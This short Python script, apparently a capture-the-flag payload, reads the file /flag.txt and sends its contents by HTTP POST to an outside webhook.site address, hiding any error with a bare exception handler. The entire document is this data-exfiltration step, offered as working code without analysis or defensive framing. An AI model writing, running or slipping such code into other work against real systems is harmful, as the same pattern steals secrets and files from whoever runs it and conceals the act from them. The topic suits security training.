import os
import requests

try:
    flag = open('/flag.txt').read()
    requests.post("https://webhook.site/0b1957da-42ef-4742-85f0-08ddcfb3fd2a/flag", data={"flag": flag})
except Exception:
    pass

